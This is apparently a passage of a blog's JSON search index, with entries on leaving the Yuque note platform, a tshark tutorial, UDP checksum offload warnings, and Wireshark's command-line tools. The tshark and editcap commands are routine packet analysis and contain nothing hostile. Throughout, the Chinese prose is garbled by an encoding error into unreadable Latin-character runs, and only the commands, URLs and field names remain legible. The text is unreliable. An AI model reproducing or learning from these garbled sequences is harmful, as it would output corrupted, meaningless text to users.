æ‰èƒ½ä½“ä¼šå¯¼å‡ºå·¥å…·æ˜¯å¤šå‘çˆ¹ã€‚\nå‡å¦‚ä½ ä¸€å¤©å†³å®šä¸ç”¨è¿™ä¸ªå¹³å°äº†ï¼Œä½ æƒ³æŠŠæ‰€æœ‰ä½ äº§å‡ºçš„å†…å®¹éƒ½è¿ç§»å‡ºæ¥ï¼Œä½ è¦èŠ±è´¹å¤šå°‘æˆæœ¬å‘¢ï¼Ÿ å¾ˆå¤šäººéƒ½æ²¡æœ‰è€ƒè™‘è¿‡è¿™ä»¶äº‹æƒ…ã€‚\nå°±åƒæ¸©æ°´ç…®é’è›™ï¼Œåªæœ‰æ„Ÿè§‰åˆ°çƒ«çš„æ—¶å€™ï¼Œé’è›™æ‰ä¼šå‡†å¤‡è·³èµ°ï¼Œä½†æ˜¯é’è›™è¿˜èƒ½è·³å‡ºå»å—ï¼Ÿ å¯èƒ½ä»–çš„è…¿éƒ½å·²ç»ç…®ç†Ÿäº†å§ï¼Ÿ\nä»å¦å¤–ä¸€ä¸ªæ–¹é¢æ¥è¯´ï¼Œä½œä¸ºå†…å®¹ç”Ÿäº§è€…ï¼Œæˆ‘ä»¬è¦èŠ±æ—¶é—´ï¼ŒèŠ±ç²¾åŠ›æ¥å†™æ–‡ç« ï¼Œè¿˜è¦èŠ±é‡‘é’±æ¥ä¹°å¹³å°çš„ä¼šå‘˜ï¼Œç„¶è€Œå¹³å°å¯¹å†…å®¹ç”Ÿäº§è€…æ¥è¯´ï¼Œæœ‰ä»€ä¹ˆå›æŠ¥å‘¢ï¼Ÿ\næˆ‘ä»¬åªä¸è¿‡æ˜¯ä¸ºä»–äººåšå«è¡£ç½¢äº†ã€‚å°±åƒæ—§æ—¶ä»£çš„é•¿å·¥ï¼Œåªä¸è¿‡åœ¨ä¸€ä¸ªå¤§ä¸€ç‚¹çš„åœ°ä¸»å®¶å¹²æ´»äº†å§ã€‚\nå†è§äº†ï¼Œè¯­é›€ã€‚\næ–°çš„bolgåœ°å€: wdd.js.org\næˆ‘ä»¥å‰æ²¡å¾—é€‰ï¼Œæˆ‘ç°åœ¨æƒ³é€‰æ‹©åšä¸ªè‡ªç”±äºº\n","permalink":"https://wdd.js.org/posts/2022/06/fk9rgk/","summary":"æˆ‘æœ€æ—©ç”¨è¿‡æœ‰é“ï¼Œæˆ‘è§‰å¾—æœ‰é“å¾ˆçƒ‚ã€‚\nåæ¥æˆ‘å¼€å§‹ç”¨å°è±¡ç¬”è®°ï¼Œæˆ‘å‘ç°å°è±¡ç¬”è®°æ›´çƒ‚ã€‚ä¸ä»…ç•Œé¢åšçš„è®©äººè§‰å¾—ä¾®è¾±çœ¼ç›ï¼Œå³ä½¿ä½ å¼€äº†ä¼šå‘˜ä¹Ÿè¦çœ‹å¹¿å‘Šã€‚ å°è±¡ç¬”è®°ä¼šå‘˜è¢«å‰²äº†éŸ­èœï¼Œå……åˆ°äº†2026å¹´ï¼Œä½†æ˜¯æˆ‘æœ€è¿‘ä¸€ä¸¤å¹´æˆ‘åŸºæœ¬æ²¡æœ‰ç”¨è¿‡å°è±¡ç¬”è®°ã€‚\nåæ¥æˆ‘é‡åˆ°äº†æ–‡æ¡£blogç•Œçš„new school, notionã€è¯­é›€ã€é£ä¹¦ï¼Œ å°±å®Œå…¨æŠ›å¼ƒäº†æœ‰é“å’Œå°è±¡ç¬”è®°çš„old schoolã€‚\nåšä»»ä½•äº‹æƒ…ï¼Œéƒ½éœ€è¦åŠ¨æœºã€‚\nå†™å…¬å¼€åšå®¢ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¯èƒ½æœ‰ä»¥ä¸‹åŸå› \næå‡ä¸ªäººå½±å“åŠ› æé«˜è‡ªå·±çš„è¡¨è¾¾èƒ½åŠ› çŸ¥è¯†ç§¯ç´¯å’Œåˆ†äº« å…¬å¼€åšå®¢éœ€è¦ä¸‰æ–¹è§’åŠ›ï¼Œå¹³å°æ–¹ã€å†…å®¹ç”Ÿäº§è€…ã€å†…å®¹æ¶ˆè´¹è€…(è¯»è€…)ã€‚\nä½œä¸ºå†…å®¹ç”Ÿäº§è€…ï¼Œæˆ‘ä»¬ä»é€‰æ‹©ä¸€ä¸ªå¹³å°æ˜¯éœ€è¦å¾ˆå¤šç†ç”±çš„ã€‚å¯èƒ½æ˜¯UIç•Œé¢çš„é¢œå€¼ï¼Œå¯èƒ½æ˜¯ä¸€è§é’Ÿæƒ…ç•Œé¢äº¤äº’ã€‚\nå°±åƒç”·å¥³çš„ç›¸äº²ï¼Œé¦–å…ˆè¦è¢«å¤–è²Œå¸å¼•ï¼Œæ‰èƒ½æœ‰ä¸‹æ–‡ã€‚\nç„¶è€Œé™¤äº†é‚£ä¸€è§é’Ÿæƒ…çš„å¿…ç„¶æ˜¯çŸ­æš‚çš„ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘å‘ç°äº†å¦ä¸€ä¸ªé‡è¦åŸå› ï¼šè¿ç§»æˆæœ¬\næˆ‘ä»¥å‰å†³å®šä¸ç”¨å°è±¡çš„æ—¶å€™ï¼Œå°è±¡ç¬”è®°ä¸Šè¿˜æœ‰æˆ‘å°†è¿‘ä¸€åƒå¤šç¯‡çš„ç¬”è®°ã€‚è™½è¯´å°è±¡ç¬”è®°æœ‰å¯¼å‡ºå·¥å…·ï¼Œä½†æ˜¯åªæœ‰å½“ä½ ç”¨çš„æ—¶å€™ï¼Œä½ æ‰èƒ½ä½“ä¼šå¯¼å‡ºå·¥å…·æ˜¯å¤šå‘çˆ¹ã€‚\nå‡å¦‚ä½ ä¸€å¤©å†³å®šä¸ç”¨è¿™ä¸ªå¹³å°äº†ï¼Œä½ æƒ³æŠŠæ‰€æœ‰ä½ äº§å‡ºçš„å†…å®¹éƒ½è¿ç§»å‡ºæ¥ï¼Œä½ è¦èŠ±è´¹å¤šå°‘æˆæœ¬å‘¢ï¼Ÿ å¾ˆå¤šäººéƒ½æ²¡æœ‰è€ƒè™‘è¿‡è¿™ä»¶äº‹æƒ…ã€‚\nå°±åƒæ¸©æ°´ç…®é’è›™ï¼Œåªæœ‰æ„Ÿè§‰åˆ°çƒ«çš„æ—¶å€™ï¼Œé’è›™æ‰ä¼šå‡†å¤‡è·³èµ°ï¼Œä½†æ˜¯é’è›™è¿˜èƒ½è·³å‡ºå»å—ï¼Ÿ å¯èƒ½ä»–çš„è…¿éƒ½å·²ç»ç…®ç†Ÿäº†å§ï¼Ÿ\nä»å¦å¤–ä¸€ä¸ªæ–¹é¢æ¥è¯´ï¼Œä½œä¸ºå†…å®¹ç”Ÿäº§è€…ï¼Œæˆ‘ä»¬è¦èŠ±æ—¶é—´ï¼ŒèŠ±ç²¾åŠ›æ¥å†™æ–‡ç« ï¼Œè¿˜è¦èŠ±é‡‘é’±æ¥ä¹°å¹³å°çš„ä¼šå‘˜ï¼Œç„¶è€Œå¹³å°å¯¹å†…å®¹ç”Ÿäº§è€…æ¥è¯´ï¼Œæœ‰ä»€ä¹ˆå›æŠ¥å‘¢ï¼Ÿ\næˆ‘ä»¬åªä¸è¿‡æ˜¯ä¸ºä»–äººåšå«è¡£ç½¢äº†ã€‚å°±åƒæ—§æ—¶ä»£çš„é•¿å·¥ï¼Œåªä¸è¿‡åœ¨ä¸€ä¸ªå¤§ä¸€ç‚¹çš„åœ°ä¸»å®¶å¹²æ´»äº†å§ã€‚\nå†è§äº†ï¼Œè¯­é›€ã€‚\næ–°çš„bolgåœ°å€: wdd.js.org\næˆ‘ä»¥å‰æ²¡å¾—é€‰ï¼Œæˆ‘ç°åœ¨æƒ³é€‰æ‹©åšä¸ªè‡ªç”±äºº","title":"æœ€åä¸€ç¯‡blogï¼Œ æ˜¯æ—¶å€™è¯´å†è§äº†"},{"content":"1. ä½¿ç”¨æ‘˜è¦ ä¸€ä¸ªå‘½ä»¤çš„ä½¿ç”¨æ‘˜è¦éå¸¸é‡è¦ï¼Œæ‘˜è¦é‡ŒåŒ…å«äº†è¿™ä¸ªå·¥å…·æœ€å¸¸ç”¨çš„ç”¨æ³•ã€‚\nè¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦ç”¨è¿‡æ»¤å™¨ï¼Œä¸€å®šè¦æ”¾åˆ°æœ€åã€‚\ntshark [ -i \u0026lt;capture interface\u0026gt;|- ] [ -f \u0026lt;capture filter\u0026gt; ] [ -2 ] [ -r \u0026lt;infile\u0026gt; ] [ -w \u0026lt;outfile\u0026gt;|- ] [ options ] [ \u0026lt;filter\u0026gt; ] tshark -G [ \u0026lt;report type\u0026gt; ] [ --elastic-mapping-filter \u0026lt;protocols\u0026gt; ] 2. ä¸ºä»€ä¹ˆè¦å­¦ä¹ tshark? ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šåœ¨æœåŠ¡ç«¯ç”¨tcpdumpæŠ“åŒ…ï¼Œç„¶åæŠŠåŒ…æ‹¿ä¸‹æ¥ï¼Œç”¨wiresharkåˆ†æã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦å­¦ä¹ tsharkå‘¢ï¼Ÿ\nç›¸æ¯”äºwiresharkï¼Œ tsharkæœ‰ä»¥ä¸‹çš„ä¼˜ç‚¹\né€Ÿåº¦é£å¿«ï¼šwiresharkåœ¨åŠ è½½åŒ…çš„æ—¶å€™ï¼Œtsharkå¯èƒ½å·²ç»ç»™å‡ºäº†ç»“æœã€‚ æ›´ç¨³å®šï¼šwiresharkåœ¨å¤„ç†åŒ…çš„æ—¶å€™ï¼Œå¸¸å¸¸å®¹æ˜“å´©æºƒ æ›´é€‚åˆåšæ–‡æœ¬å¤„ç†ï¼štsharkçš„è¾“å‡ºæ˜¯æ–‡æœ¬ï¼Œè¿™ä¸ªæ–‡æœ¬å¾ˆå®¹æ˜“è¢«awk, sort, uniqç­‰ç­‰å‘½ä»¤å¤„ç† ä½†æ˜¯æˆ‘ä¸å»ºè®®ä¸Šæ¥å°±å­¦ä¹ ï¼Œæ›´å»ºè®®åœ¨ç†Ÿæ‚‰wiresharkä¹‹åï¼Œå†å»è¿›ä¸€æ­¥å­¦ä¹ tshark\n3. ä½¿ç”¨åœºæ™¯ 3.1 åŸºæœ¬åœºæ™¯ ç”¨wiresharkæœ€åŸºæœ¬çš„åœºæ™¯çš„æŠŠpcapæ–‡ä»¶æ‹–åŠ¨åˆ°wiresharkä¸­ï¼Œç„¶åå¯èƒ½åŠ å…¥ä¸€äº›è¿‡æ»¤æ¡ä»¶ã€‚\ntshark -r demo.pcap tshark -r demo.pcap -c 1 # åªè¯»ä¸€ä¸ªåŒ…å°±åœæ­¢ è¾“å‡ºçš„åˆ—åˆ†åˆ«ä¸ºï¼šåºå·ï¼Œç›¸å¯¹æ—¶é—´ï¼Œç»å¯¹æ—¶é—´ï¼Œæºip, æºç«¯å£ï¼Œç›®æ ‡ip, ç›®æ ‡ç«¯å£\n3.2 æŒ‰ç…§è¡¨æ ¼è¾“å‡º tshark -r demo.pcap -T tabs 3.3 æŒ‰ç…§æŒ‡å®šçš„åˆ—è¾“å‡º ä¾‹å¦‚ï¼ŒæŠ“çš„çš„sipçš„åŒ…ï¼Œæˆ‘ä»¬åªæƒ³è¾“å‡ºsipçš„user-agentå­—æ®µã€‚\ntshark -r demo.pcap -Tfields -e sip.User-Agent sip and sip.Method==REGISTER æŒ‰ç…§ä¸Šé¢çš„è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç®€å•çš„sortå’Œseqå°±å¯ä»¥æŠŠæ‰€æœ‰çš„è®¾å¤‡ç±»å‹æ‰“å°å‡ºæ¥ã€‚\n3.4 è¿‡æ»¤ä¹‹åå†™å…¥æ–‡ä»¶ æ¯”å¦‚ä¸€ä¸ªå¾ˆå¤§çš„pcapæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨tsharkè¿‡æ»¤ä¹‹åï¼Œå†™å…¥ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚\nä¾‹å¦‚ä¸‹é¢çš„ï¼Œæˆ‘ä»¬ä½¿ç”¨è¿‡æ»¤å™¨sip and sip.Method==REGISTER, ç„¶åæŠŠè¿‡æ»¤åçš„åŒ…å†™å…¥åˆ°register.pcap\nâ— -Y \u0026ldquo;sip and frame.cap_len \u0026gt; 1300\u0026rdquo; æŸ¥çœ‹æ¯”è¾ƒå¤§çš„SIPåŒ… tshark -r demo.pcap -w register.pcap sip and sip.Method==REGISTER\n3.4 ç»Ÿè®¡åˆ†æ tsharkæ”¯æŒç»Ÿè®¡åˆ†æï¼Œä¾‹å¦‚ç»Ÿè®¡rtp ä¸¢åŒ…ç‡ã€‚\ntshark -r demo.pcap -qn -z rtp,streams -zå‚æ•°æ˜¯ç”¨æ¥å„ç§ç»Ÿè®¡åˆ†æçš„ï¼Œå…·ä½“æ”¯æŒçš„ç»Ÿè®¡ç±»å‹ï¼Œå¯ä»¥ç”¨\ntshark -z help âœ Desktop tshark -z help afp,srt ancp,tree ansi_a,bsmap ansi_a,dtap ansi_map asap,stat bacapp_instanceid,tree bacapp_ip,tree bacapp_objectid,tree bacapp_service,tree calcappprotocol,stat camel,counter camel,srt collectd,tree componentstatusprotocol,stat conv,bluetooth conv,dccp conv,eth conv,fc å‚è€ƒ https://www.wireshark.org/docs/man-pages/tshark.html ","permalink":"https://wdd.js.org/network/tshark/","summary":"1. ä½¿ç”¨æ‘˜è¦ ä¸€ä¸ªå‘½ä»¤çš„ä½¿ç”¨æ‘˜è¦éå¸¸é‡è¦ï¼Œæ‘˜è¦é‡ŒåŒ…å«äº†è¿™ä¸ªå·¥å…·æœ€å¸¸ç”¨çš„ç”¨æ³•ã€‚\nè¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦ç”¨è¿‡æ»¤å™¨ï¼Œä¸€å®šè¦æ”¾åˆ°æœ€åã€‚\ntshark [ -i \u0026lt;capture interface\u0026gt;|- ] [ -f \u0026lt;capture filter\u0026gt; ] [ -2 ] [ -r \u0026lt;infile\u0026gt; ] [ -w \u0026lt;outfile\u0026gt;|- ] [ options ] [ \u0026lt;filter\u0026gt; ] tshark -G [ \u0026lt;report type\u0026gt; ] [ --elastic-mapping-filter \u0026lt;protocols\u0026gt; ] 2. ä¸ºä»€ä¹ˆè¦å­¦ä¹ tshark? ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šåœ¨æœåŠ¡ç«¯ç”¨tcpdumpæŠ“åŒ…ï¼Œç„¶åæŠŠåŒ…æ‹¿ä¸‹æ¥ï¼Œç”¨wiresharkåˆ†æã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦å­¦ä¹ tsharkå‘¢ï¼Ÿ\nç›¸æ¯”äºwiresharkï¼Œ tsharkæœ‰ä»¥ä¸‹çš„ä¼˜ç‚¹\né€Ÿåº¦é£å¿«ï¼šwiresharkåœ¨åŠ è½½åŒ…çš„æ—¶å€™ï¼Œtsharkå¯èƒ½å·²ç»ç»™å‡ºäº†ç»“æœã€‚ æ›´ç¨³å®šï¼šwiresharkåœ¨å¤„ç†åŒ…çš„æ—¶å€™ï¼Œå¸¸å¸¸å®¹æ˜“å´©æºƒ æ›´é€‚åˆåšæ–‡æœ¬å¤„ç†ï¼štsharkçš„è¾“å‡ºæ˜¯æ–‡æœ¬ï¼Œè¿™ä¸ªæ–‡æœ¬å¾ˆå®¹æ˜“è¢«awk, sort, uniqç­‰ç­‰å‘½ä»¤å¤„ç† ä½†æ˜¯æˆ‘ä¸å»ºè®®ä¸Šæ¥å°±å­¦ä¹ ï¼Œæ›´å»ºè®®åœ¨ç†Ÿæ‚‰wiresharkä¹‹åï¼Œå†å»è¿›ä¸€æ­¥å­¦ä¹ tshark\n3. ä½¿ç”¨åœºæ™¯ 3.1 åŸºæœ¬åœºæ™¯ ç”¨wiresharkæœ€åŸºæœ¬çš„åœºæ™¯çš„æŠŠpcapæ–‡ä»¶æ‹–åŠ¨åˆ°wiresharkä¸­ï¼Œç„¶åå¯èƒ½åŠ å…¥ä¸€äº›è¿‡æ»¤æ¡ä»¶ã€‚\ntshark -r demo.pcap tshark -r demo.pcap -c 1 # åªè¯»ä¸€ä¸ªåŒ…å°±åœæ­¢ è¾“å‡ºçš„åˆ—åˆ†åˆ«ä¸ºï¼šåºå·ï¼Œç›¸å¯¹æ—¶é—´ï¼Œç»å¯¹æ—¶é—´ï¼Œæºip, æºç«¯å£ï¼Œç›®æ ‡ip, ç›®æ ‡ç«¯å£","title":"Tsharkå…¥é—¨åˆ°ç²¾é€š"},{"content":"åœ¨æœåŠ¡ç«¯æŠ“åŒ…ï¼Œç„¶ååœ¨wiresharkä¸Šåˆ†æï¼Œå‘ç°wiresharkæç¤ºï¼šudp checksumå­—æ®µæœ‰é—®é¢˜\nchecksum 0x\u0026hellip; incrorect should be 0x.. (maybe caused by udp checksum offload)\nä»¥å‰æˆ‘ä»æœªé‡åˆ°è¿‡udp checksumçš„é—®é¢˜ã€‚æ‰€ä»¥è¿™æ¬¡æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæ‰€ä»¥éœ€è¦å­¦ä¹ ä¸€ä¸‹ã€‚ é¦–å…ˆudp checksumæ˜¯ä»€ä¹ˆï¼Ÿ\næˆ‘ä»¬çœ‹ä¸‹udpçš„åè®®ç»„æˆçš„å­—æ®µï¼Œå…¶ä¸­å°±æœ‰16ä½çš„æ ¡éªŒå’Œ\næ ¡éªŒå’Œä¸€èˆ¬éƒ½æ˜¯ä¸ºäº†æ£€éªŒæ•°æ®åŒ…åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦å‡ºç°å˜åŠ¨çš„ã€‚\nå¦‚æœæ¥å—ç«¯æ”¶åˆ°çš„udpæ¶ˆæ¯æ ¡éªŒå’Œé”™è¯¯ï¼Œå°†ä¼šè¢«æ‚„æ‚„çš„ä¸¢å¼ƒ udpæ ¡éªŒå’Œæ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„æ ¡éªŒå’Œã€‚ç«¯åˆ°ç«¯æ„å‘³å®ƒä¸ä¼šåœ¨ä¸­é—´ç½‘ç»œè®¾å¤‡ä¸Šæ ¡éªŒã€‚ æ ¡éªŒå’Œç”±å‘é€æ–¹è´Ÿè´£è®¡ç®—ï¼Œæ¥æ”¶ç«¯è´Ÿè´£éªŒè¯ã€‚ç›®çš„æ˜¯ä¸ºäº†å‘ç°udpé¦–éƒ¨å’Œå’Œæ•°æ®åœ¨å‘é€ç«¯å’Œæ¥å—ç«¯ä¹‹é—´æ˜¯å¦å‘ç”Ÿäº†å˜åŠ¨ udpæ ¡éªŒå’Œæ˜¯å¯é€‰çš„åŠŸèƒ½ï¼Œä½†æ˜¯æ€»æ˜¯åº”è¯¥è¢«é»˜è®¤å¯ç”¨ã€‚ å¦‚æœå‘é€æ–¹è®¾ç½®äº†udpæ ¡éªŒå’Œï¼Œåˆ™æ¥å—æ–¹å¿…é¡»éªŒè¯ å‘é€æ–¹è´Ÿè´£è®¡ç®—ï¼Ÿå…·ä½“æ˜¯è°è´Ÿè´£è®¡ç®—\nè®¡ç®—ä¸€èˆ¬éƒ½æ˜¯CPUçš„å·¥ä½œï¼Œä½†æ˜¯æœ‰äº›ç½‘å¡ä¹Ÿæ˜¯æ”¯æŒchecksum offloadçš„ã€‚\næ‰€è°“offload, æ˜¯æŒ‡æœ¬æ¥å¯ä»¥ç”±cpuè®¡ç®—çš„ï¼Œæ”¹å˜ç”±ç½‘å¡ç¡¬ä»¶è´Ÿè´£è®¡ç®—ã€‚ è¿™æ ·åšæœ‰å¾ˆå¤šå¥½å¤„ï¼Œ\nå¯ä»¥é™ä½cpuçš„è´Ÿè½½ï¼Œæé«˜ç³»ç»Ÿçš„æ€§èƒ½ ç½‘å¡çš„ç¡¬ä»¶checksum, æ•ˆç‡æ›´é«˜ ä¸ºä»€ä¹ˆåªæœ‰å‘é€æ–¹å‡ºç°udp checksum é”™è¯¯ï¼Ÿ æˆ‘åœ¨æ¥å—æ–¹å’Œæ”¾æ¾æ–¹éƒ½è¿›è¡Œäº†æŠ“åŒ…ï¼Œä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„ç‰¹å¾æ˜¯ï¼Œåªæœ‰å‘é€æ–¹å‘ç°äº†udp checksumçš„é”™è¯¯ï¼Œåœ¨æ¥å—æ–¹ï¼ŒåŒæ ·çš„åŒ…ï¼Œudp checksumçš„å€¼å´æ˜¯æ­£ç¡®çš„ã€‚\nä¸€å¥è¯çš„è§£é‡Šï¼štcpdumpåœ¨æ¥æ”¶æ–¹æŠ“åˆ°çš„åŒ…ï¼Œæœ¬èº«checksumå­—æ®µè¿˜æ²¡æœ‰è¢«è®¡ç®—ï¼Œåœ¨åç»­çš„æ­¥éª¤ï¼Œè¿™ä¸ªåŒ…æ‰ä¼šè¢«äº¤ç»™NIC, NICæ¥è´Ÿè´£è®¡ç®—ã€‚\nç»“è®º maybe caused by udp checksum offload è¿™ä¸ªæŠ¥é”™å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚\nå‚è€ƒ â— ã€Štcp/ip è¯¦è§£ã€‹ â— https://www.kernel.org/doc/html/latest/networking/checksum-offloads.html â— https://dominikrys.com/posts/disable-udp-checksum-validation/ â— https://sokratisg.net/2012/04/01/udp-tcp-checksum-errors-from-tcpdump-nic-hardware-offloading/\n","permalink":"https://wdd.js.org/network/udp-checksum-offload/","summary":"åœ¨æœåŠ¡ç«¯æŠ“åŒ…ï¼Œç„¶ååœ¨wiresharkä¸Šåˆ†æï¼Œå‘ç°wiresharkæç¤ºï¼šudp checksumå­—æ®µæœ‰é—®é¢˜\nchecksum 0x\u0026hellip; incrorect should be 0x.. (maybe caused by udp checksum offload)\nä»¥å‰æˆ‘ä»æœªé‡åˆ°è¿‡udp checksumçš„é—®é¢˜ã€‚æ‰€ä»¥è¿™æ¬¡æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæ‰€ä»¥éœ€è¦å­¦ä¹ ä¸€ä¸‹ã€‚ é¦–å…ˆudp checksumæ˜¯ä»€ä¹ˆï¼Ÿ\næˆ‘ä»¬çœ‹ä¸‹udpçš„åè®®ç»„æˆçš„å­—æ®µï¼Œå…¶ä¸­å°±æœ‰16ä½çš„æ ¡éªŒå’Œ\næ ¡éªŒå’Œä¸€èˆ¬éƒ½æ˜¯ä¸ºäº†æ£€éªŒæ•°æ®åŒ…åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦å‡ºç°å˜åŠ¨çš„ã€‚\nå¦‚æœæ¥å—ç«¯æ”¶åˆ°çš„udpæ¶ˆæ¯æ ¡éªŒå’Œé”™è¯¯ï¼Œå°†ä¼šè¢«æ‚„æ‚„çš„ä¸¢å¼ƒ udpæ ¡éªŒå’Œæ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„æ ¡éªŒå’Œã€‚ç«¯åˆ°ç«¯æ„å‘³å®ƒä¸ä¼šåœ¨ä¸­é—´ç½‘ç»œè®¾å¤‡ä¸Šæ ¡éªŒã€‚ æ ¡éªŒå’Œç”±å‘é€æ–¹è´Ÿè´£è®¡ç®—ï¼Œæ¥æ”¶ç«¯è´Ÿè´£éªŒè¯ã€‚ç›®çš„æ˜¯ä¸ºäº†å‘ç°udpé¦–éƒ¨å’Œå’Œæ•°æ®åœ¨å‘é€ç«¯å’Œæ¥å—ç«¯ä¹‹é—´æ˜¯å¦å‘ç”Ÿäº†å˜åŠ¨ udpæ ¡éªŒå’Œæ˜¯å¯é€‰çš„åŠŸèƒ½ï¼Œä½†æ˜¯æ€»æ˜¯åº”è¯¥è¢«é»˜è®¤å¯ç”¨ã€‚ å¦‚æœå‘é€æ–¹è®¾ç½®äº†udpæ ¡éªŒå’Œï¼Œåˆ™æ¥å—æ–¹å¿…é¡»éªŒè¯ å‘é€æ–¹è´Ÿè´£è®¡ç®—ï¼Ÿå…·ä½“æ˜¯è°è´Ÿè´£è®¡ç®—\nè®¡ç®—ä¸€èˆ¬éƒ½æ˜¯CPUçš„å·¥ä½œï¼Œä½†æ˜¯æœ‰äº›ç½‘å¡ä¹Ÿæ˜¯æ”¯æŒchecksum offloadçš„ã€‚\næ‰€è°“offload, æ˜¯æŒ‡æœ¬æ¥å¯ä»¥ç”±cpuè®¡ç®—çš„ï¼Œæ”¹å˜ç”±ç½‘å¡ç¡¬ä»¶è´Ÿè´£è®¡ç®—ã€‚ è¿™æ ·åšæœ‰å¾ˆå¤šå¥½å¤„ï¼Œ\nå¯ä»¥é™ä½cpuçš„è´Ÿè½½ï¼Œæé«˜ç³»ç»Ÿçš„æ€§èƒ½ ç½‘å¡çš„ç¡¬ä»¶checksum, æ•ˆç‡æ›´é«˜ ä¸ºä»€ä¹ˆåªæœ‰å‘é€æ–¹å‡ºç°udp checksum é”™è¯¯ï¼Ÿ æˆ‘åœ¨æ¥å—æ–¹å’Œæ”¾æ¾æ–¹éƒ½è¿›è¡Œäº†æŠ“åŒ…ï¼Œä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„ç‰¹å¾æ˜¯ï¼Œåªæœ‰å‘é€æ–¹å‘ç°äº†udp checksumçš„é”™è¯¯ï¼Œåœ¨æ¥å—æ–¹ï¼ŒåŒæ ·çš„åŒ…ï¼Œudp checksumçš„å€¼å´æ˜¯æ­£ç¡®çš„ã€‚\nä¸€å¥è¯çš„è§£é‡Šï¼štcpdumpåœ¨æ¥æ”¶æ–¹æŠ“åˆ°çš„åŒ…ï¼Œæœ¬èº«checksumå­—æ®µè¿˜æ²¡æœ‰è¢«è®¡ç®—ï¼Œåœ¨åç»­çš„æ­¥éª¤ï¼Œè¿™ä¸ªåŒ…æ‰ä¼šè¢«äº¤ç»™NIC, NICæ¥è´Ÿè´£è®¡ç®—ã€‚\nç»“è®º maybe caused by udp checksum offload è¿™ä¸ªæŠ¥é”™å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚\nå‚è€ƒ â— ã€Štcp/ip è¯¦è§£ã€‹ â— https://www.kernel.org/doc/html/latest/networking/checksum-offloads.html â— https://dominikrys.com/posts/disable-udp-checksum-validation/ â— https://sokratisg.net/2012/04/01/udp-tcp-checksum-errors-from-tcpdump-nic-hardware-offloading/","title":"Udp Checksum Offload"},{"content":"å¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬éƒ½æ˜¯å›¾å½¢ç•Œé¢çš„æ–¹å¼ä½¿ç”¨wireshak, å…¶å®ä¸€èˆ¬åªè¦ä½ å®‰è£…äº†wiresharkï¼ŒåŒæ—¶ä¹Ÿé™„å¸¦å®‰è£…äº†ä¸€äº›å‘½ä»¤è¡Œå·¥å…·ã€‚ è¿™äº›å·¥å…·ä¹Ÿå¯ä»¥æå¤§çš„æé«˜ç”Ÿäº§æ•ˆç‡ã€‚ æœ¬æ–‡åªæ˜¯å¯¹å·¥å…·çš„åŠŸèƒ½ç®€ä»‹ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ -h, æŸ¥çœ‹å‘½ä»¤çš„å…·ä½“ä½¿ç”¨æ–‡æ¡£ã€‚\n1. editcap ç¼–è¾‘æŠ“åŒ…æ–‡ä»¶ Editcap (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Edit and/or translate the format of capture files. ä¸¾ä¾‹: æŒ‰ç…§æ—¶é—´èŒƒå›´ä»input.pcapæ–‡ä»¶ä¸­æ‹¿å‡ºæŒ‡å®šæ—¶é—´èŒƒå›´çš„åŒ…\neditcap -A \u0026#39;2014-12-10 10:11:01\u0026#39; -B \u0026#39;2014-12-10 10:21:01\u0026#39; input.pcap output.pcap 2. androiddump è¿™ä¸ªå‘½ä»¤ä¼¼ä¹å¯ä»¥ç”¨æ¥å¯¹å®‰å“ç³»ç»Ÿè¿›è¡ŒæŠ“åŒ…ï¼Œæ²¡ç©è¿‡å®‰å“ï¼Œä¸å†å¤šè¯´ã€‚\nWireshark - androiddump v1.1.0 Usage: androiddump --extcap-interfaces [--adb-server-ip=\u0026lt;arg\u0026gt;] [--adb-server-tcp-port=\u0026lt;arg\u0026gt;] androiddump --extcap-interface=INTERFACE --extcap-dlts androiddump --extcap-interface=INTERFACE --extcap-config androiddump --extcap-interface=INTERFACE --fifo=PATH_FILENAME --capture 3. ciscodump ä¼¼ä¹æ˜¯å¯¹æ€ç§‘çš„ç½‘ç»œè¿›è¡ŒæŠ“åŒ…çš„ï¼Œæ²¡ç”¨è¿‡ Wireshark - ciscodump v1.0.0 Usage: ciscodump \u0026ndash;extcap-interfaces ciscodump \u0026ndash;extcap-interface=ciscodump \u0026ndash;extcap-dlts ciscodump \u0026ndash;extcap-interface=ciscodump \u0026ndash;extcap-config ciscodump \u0026ndash;extcap-interface=ciscodump \u0026ndash;remote-host myhost \u0026ndash;remote-port 22222 \u0026ndash;remote-username myuser \u0026ndash;remote-interface gigabit0/0 \u0026ndash;fifo=FILENAME \u0026ndash;capture\n4. randpktdump è¿™ä¸ªä¼¼ä¹ä¹Ÿæ˜¯ä¸€ä¸ªç½‘ç»œæŠ“åŒ…çš„ Wireshark - randpktdump v0.1.0 Usage: randpktdump \u0026ndash;extcap-interfaces randpktdump \u0026ndash;extcap-interface=randpkt \u0026ndash;extcap-dlts randpktdump \u0026ndash;extcap-interface=randpkt \u0026ndash;extcap-config randpktdump \u0026ndash;extcap-interface=randpkt \u0026ndash;type dns \u0026ndash;count 10 \u0026ndash;fifo=FILENAME \u0026ndash;capture\n5. sshdump 